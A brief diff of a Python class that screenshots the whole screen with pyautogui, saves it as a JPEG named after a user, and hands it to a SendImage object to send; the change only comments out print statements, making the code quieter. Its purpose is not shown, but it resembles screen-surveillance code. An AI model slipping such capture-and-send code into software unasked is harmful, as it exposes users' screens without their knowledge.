@@ -14,9 +14,9 @@ class Take():
 		image_name = f"{self.u_name}"
 		myscreen = pyautogui.screenshot()
 		cur_path = os.getcwd()
-		print(cur_path)
+		# print(cur_path)
 		myscreen.save(f'{image_name}.jpeg')
-		print(f'{image_name}.jpeg')
+		# print(f'{image_name}.jpeg')
 		temp = SendImage(self.id, f'{image_name}.jpeg')
 		temp.send()
 		# temp = Upload(f'{image_name}.png').drive_upload()
